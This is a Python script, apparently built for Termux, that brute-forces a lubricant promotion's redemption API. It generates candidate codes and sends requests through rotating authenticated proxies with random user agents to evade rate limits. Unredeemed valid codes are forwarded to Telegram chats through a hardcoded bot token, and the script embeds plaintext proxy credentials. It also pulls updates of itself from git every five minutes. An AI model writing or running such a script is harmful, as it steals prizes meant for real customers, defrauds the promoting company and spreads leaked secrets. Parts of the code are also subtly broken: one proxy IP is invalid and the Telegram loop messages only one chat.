import asyncio
import aiohttp
import aiofiles
import random
import time
import logging
from datetime import datetime
import subprocess

# Konfigurasi warna ANSI untuk output di Termux
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
WHITE = "\033[97m"
BRIGHT = "\033[1m"
RESET = "\033[0m"

# Konfigurasi logging
logging.basicConfig(
    filename=f'validation_{datetime.now().strftime("%Y%m%d_%H%M")}.log',
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Konfigurasi Telegram dan User Agents
TELEGRAM_BOT_TOKEN = '7620704354:AAFa19rWmJ3pQKEExzK4hJGxSi26BTz-t1E'
CHAT_IDS = ['6426778764', '6180131575']

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Static proxy list
STATIC_PROXIES = [
    {'proxy_host': '45.198.6.244', 'proxy_port': '7777', 'proxy_username': 'lv0u1e11ca', 'proxy_password': 'ysdoqvktjm'},
    {'proxy_host': '445.198.19.92', 'proxy_port': '7777', 'proxy_username': 'ol6amlsbuk', 'proxy_password': 'mruqlb11tg'},
    {'proxy_host': '45.198.19.82', 'proxy_port': '7777', 'proxy_username': 'v00hs54eoq', 'proxy_password': 'vaixxby9uh'},
    {'proxy_host': '45.198.10.229', 'proxy_port': '7777', 'proxy_username': 'qycd1hv50o', 'proxy_password': 'qt3kvvszkq'},
    {'proxy_host': '45.198.10.251', 'proxy_port': '7777', 'proxy_username': 'j3xg72jnfe', 'proxy_password': 'm1ra5j1335'},
    {'proxy_host': '45.198.6.237', 'proxy_port': '7777', 'proxy_username': 'elhqal71lj', 'proxy_password': 'e8v0c87a6j'},
    {'proxy_host': '45.198.6.240', 'proxy_port': '7777', 'proxy_username': '8gdkmgi3te', 'proxy_password': 'ax78y98jhv'},
    {'proxy_host': '45.198.20.86', 'proxy_port': '7777', 'proxy_username': 'o7oklj3qj4', 'proxy_password': 'dq6l86onh1'},
    {'proxy_host': '45.198.5.236', 'proxy_port': '7777', 'proxy_username': 'tkh924xydl', 'proxy_password': 'ckh7f0cq4w'},
    {'proxy_host': '45.198.22.100', 'proxy_port': '7777', 'proxy_username': '4bbk2qidrl', 'proxy_password': 'mqhogw8s4w'}
]

# Rotating proxy
ROTATING_PROXY = {
    'proxy_host': 'as.a5hzsdfb.lunaproxy.net',
    'proxy_port': '12233',
    'proxy_username': 'user-termuxbot_Z7mtB',
    'proxy_password': 'Qwerty9'
}

static_proxy_index = 0

def get_static_proxy():
    """Rotasi static proxy berdasarkan index"""
    global static_proxy_index
    proxy = STATIC_PROXIES[static_proxy_index]
    static_proxy_index = (static_proxy_index + 1) % len(STATIC_PROXIES)
    return proxy

class CodeValidator:
    def __init__(self, device_id, total_devices):
        self.device_id = device_id
        self.total_devices = total_devices
        self.sem = asyncio.Semaphore(1000)
        self.batch_size = 50
        self.valid_code_batch = []
        self.total_valid = 0
        self.total_invalid = 0
        self.total_error = 0
        self.total_processed = 0

        self.prefixes = ["BY", "MF", "CW", "J8", "9L"]
        self.suffixes = ["LH", "8D", "8M", "YX", "TK", "4Y", "9Y", "9X"]

    def generate_code(self):
        """Generate kode dengan format [prefix][4 random alphanumeric][suffix]"""
        prefix = random.choice(self.prefixes)
        middle_part = ''.join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=4))
        suffix = random.choice(self.suffixes)
        return f"{prefix}{middle_part}{suffix}"

    async def validate_code(self, session, code):
        async with self.sem:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json',
                'Accept-Encoding': 'gzip, deflate'
            }
            payload = {"uniq_code": code}

            for attempt in range(2):  # Static proxy first
                proxy_config = get_static_proxy()
                proxy_url = f"http://{proxy_config['proxy_host']}:{proxy_config['proxy_port']}"
                proxy_auth = aiohttp.BasicAuth(
                    login=proxy_config['proxy_username'],
                    password=proxy_config['proxy_password']
                )
                try:
                    async with session.post(
                        'https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal',
                        json=payload,
                        headers=headers,
                        proxy=proxy_url,
                        proxy_auth=proxy_auth,
                        timeout=5
                    ) as response:
                        if response.status == 200:
                            resp_json = await response.json()
                            if resp_json.get("meta", {}).get("code") == 200 and not resp_json.get("data", {}).get("is_redeem"):
                                await self.record_valid_code(code)
                                return
                except Exception as e:
                    logger.warning(f"Static proxy failed {e}")

            # Fallback to rotating proxy
            proxy_url = f"http://{ROTATING_PROXY['proxy_host']}:{ROTATING_PROXY['proxy_port']}"
            proxy_auth = aiohttp.BasicAuth(
                login=ROTATING_PROXY['proxy_username'],
                password=ROTATING_PROXY['proxy_password']
            )
            try:
                async with session.post(
                    'https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal',
                    json=payload,
                    headers=headers,
                    proxy=proxy_url,
                    proxy_auth=proxy_auth,
                    timeout=5
                ) as response:
                    if response.status == 200:
                        resp_json = await response.json()
                        if resp_json.get("meta", {}).get("code") == 200 and not resp_json.get("data", {}).get("is_redeem"):
                            await self.record_valid_code(code)
            except Exception as e:
                logger.error(f"Rotating proxy failed {e}")

    async def record_valid_code(self, code):
        """Simpan kode valid ke file dan tambahkan ke batch"""
        async with aiofiles.open('valid_codes.txt', 'a') as f:
            await f.write(f"{code}\n")

        self.valid_code_batch.append(code)

        # Kirim batch ke Telegram jika sudah mencapai 500 kode
        if len(self.valid_code_batch) >= 500:
            await self.send_batch_recap()

    async def send_batch_recap(self):
        """Kirim rekap batch 500 kode valid ke Telegram"""
        if len(self.valid_code_batch) < 500:
            return

        recap_message = "\n".join(self.valid_code_batch)

        for chat_id in CHAT_IDS:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {'chat_id': chat_id, 'text': recap_message}

        async with aiohttp.ClientSession() as session:
                async with session.post(url, data=payload) as response:
                    if response.status != 200:
                        logger.error(f"Gagal mengirim pesan ke Telegram: {await response.text()}")

        self.valid_code_batch = []  # Reset batch setelah pengiriman

async def check_for_updates():
    """Cek pembaruan di GitHub setiap 5 menit"""
    while True:
        try:
            subprocess.run(["git", "fetch"], capture_output=True, text=True)
            result = subprocess.run(["git", "log", "..origin/main"], capture_output=True, text=True)
            if "commit" in result.stdout:
                subprocess.run(["git", "pull"], capture_output=True, text=True)
                print(f"{GREEN}Skrip diperbarui dari GitHub!{RESET}")
        except Exception as e:
            print(f"{RED}Gagal memeriksa pembaruan: {e}{RESET}")
        await asyncio.sleep(300)  # Cek pembaruan setiap 5 menit

async def main():
    start_time = time.time()
    device_id = 1  # Inisialisasi ID perangkat
    total_devices = 5  # Total perangkat contoh
    validator = CodeValidator(device_id, total_devices)

    update_task = asyncio.create_task(check_for_updates())  # Task untuk cek pembaruan

    async with aiohttp.ClientSession() as session:
        while True:
            # Generate dan validasi batch kode
            codes = [validator.generate_code() for _ in range(validator.batch_size)]
            tasks = [validator.validate_code(session, code) for code in codes]

            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Hitung total yang sudah divalidasi dan tampilkan statusnya
            validator.total_processed += len([r for r in results if isinstance(r, tuple)])
            elapsed_time = time.time() - start_time
            print(f"{YELLOW}Device: {validator.device_id}{RESET}")
            print(f"{BLUE}Total Validasi Kode: {validator.total_processed}{RESET}")
            print(f"{GREEN}Total Kode Valid: {validator.total_valid}{RESET}")
            print(f"{YELLOW}Total Kode Invalid: {validator.total_invalid}{RESET}")
            print(f"{RED}Total Kode Error: {validator.total_error}{RESET}")
            print(f"{WHITE}Waktu Validasi: {elapsed_time:.2f} detik{RESET}")

            await asyncio.sleep(0.1)  # Tunggu sebelum batch berikutnya

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Shutting down...{RESET}")
    except Exception as e:
        print(f"\n{RED}Error: {e}{RESET}")
        logger.error(f"Fatal error: {e}")

